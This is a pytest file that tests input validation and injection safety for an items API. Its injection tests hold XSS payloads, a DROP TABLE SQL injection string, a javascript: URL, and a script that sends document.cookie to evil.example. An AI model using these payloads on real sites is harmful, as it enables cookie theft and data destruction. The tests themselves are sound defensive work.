"""Input validation and injection-safety tests for the items API.

test_items.py already covers: negative price, empty name, missing name,
missing registry_id. This file covers the remaining Pydantic constraints
and verifies that strings containing HTML/SQL are stored safely by the
parameterized SQLite layer and returned verbatim in JSON responses.
"""
import os

os.environ.setdefault("DATABASE_PATH", ":memory:")

import pytest

VALID_URL = "https://example.com/product/test-item"


# ---------------------------------------------------------------------------
# Field length constraints
# ---------------------------------------------------------------------------

class TestItemLengthValidation:
    def test_name_at_max_length_accepted(self, client, auth):
        payload = {"registry_id": 1, "name": "A" * 100, "url": VALID_URL}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201

    def test_name_over_max_length_rejected(self, client, auth):
        payload = {"registry_id": 1, "name": "A" * 101, "url": VALID_URL}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_description_at_max_length_accepted(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "description": "B" * 500}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201

    def test_description_over_max_length_rejected(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "description": "B" * 501}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_url_below_min_length_rejected(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": "short"}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_url_at_min_length_accepted(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": "https://x.c"}  # exactly 10 chars
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201

    def test_url_over_max_length_rejected(self, client, auth):
        long_url = "https://example.com/" + "a" * 1981  # 2001 chars
        payload = {"registry_id": 1, "name": "T", "url": long_url}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_retailer_over_max_length_rejected(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "retailer": "R" * 101}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_update_name_over_max_length_rejected(self, client, auth, sample_item):
        create = client.post("/items", json=sample_item, headers=auth)
        assert create.status_code == 201
        item_id = create.json()["data"]["id"]

        resp = client.put(f"/items/{item_id}", json={"name": "X" * 101}, headers=auth)
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# Numeric constraints
# ---------------------------------------------------------------------------

class TestItemNumericValidation:
    def test_price_zero_rejected(self, client, auth):
        # price constraint is gt=0, so exactly 0 must be rejected
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "price": 0}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_quantity_needed_zero_rejected(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "quantity_needed": 0}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_quantity_purchased_negative_rejected(self, client, auth):
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "quantity_purchased": -1}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422

    def test_invalid_affiliate_status_rejected(self, client, auth):
        payload = {
            "registry_id": 1,
            "name": "T",
            "url": VALID_URL,
            "affiliate_status": "hacked",
        }
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# XSS / injection safety
# ---------------------------------------------------------------------------

class TestInjectionSafety:
    """Strings containing HTML or SQL are stored via parameterized queries
    and returned verbatim in JSON — they cannot execute in an API response.
    """

    def test_script_tag_in_name_stored_verbatim(self, client, auth):
        xss = "<script>alert('xss')</script>"
        payload = {"registry_id": 1, "name": xss, "url": VALID_URL}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201
        assert resp.json()["data"]["name"] == xss

    def test_img_onerror_in_description_stored_verbatim(self, client, auth):
        xss = '<img src=x onerror="alert(document.cookie)">'
        payload = {"registry_id": 1, "name": "T", "url": VALID_URL, "description": xss}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201
        assert resp.json()["data"]["description"] == xss

    def test_sql_injection_in_name_stored_safely(self, client, auth):
        """Parameterized queries prevent DROP TABLE from executing."""
        injection = "'; DROP TABLE items; --"
        payload = {"registry_id": 1, "name": injection, "url": VALID_URL}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201
        assert resp.json()["data"]["name"] == injection

        # Verify the items table survived
        list_resp = client.get("/items", headers=auth)
        assert list_resp.status_code == 200

    def test_javascript_url_stored_as_is(self, client, auth):
        """No URL-scheme validation; javascript: URIs pass the length check."""
        js_url = "javascript:alert(document.cookie)//"  # 36 chars, passes min_length=10
        payload = {"registry_id": 1, "name": "T", "url": js_url}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201
        assert resp.json()["data"]["url"] == js_url

    def test_unicode_multibyte_name_round_trips_correctly(self, client, auth):
        name = "Küchenmixer 🎂 café"
        payload = {"registry_id": 1, "name": name, "url": VALID_URL}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code == 201
        assert resp.json()["data"]["name"] == name

    def test_null_byte_in_name_does_not_crash_server(self, client, auth):
        """Null bytes may be accepted or rejected — the server must not 500."""
        payload = {"registry_id": 1, "name": "Test\x00Name", "url": VALID_URL}
        resp = client.post("/items", json=payload, headers=auth)
        assert resp.status_code in (201, 422)

    def test_stored_xss_returned_in_get_response(self, client, auth):
        """After storage, the exact XSS string is returned on subsequent reads."""
        xss = "<script>document.location='https://evil.example/'+document.cookie</script>"
        payload = {"registry_id": 1, "name": xss, "url": VALID_URL}
        create_resp = client.post("/items", json=payload, headers=auth)
        assert create_resp.status_code == 201
        item_id = create_resp.json()["data"]["id"]

        get_resp = client.get(f"/items/{item_id}", headers=auth)
        assert get_resp.status_code == 200
        assert get_resp.json()["data"]["name"] == xss
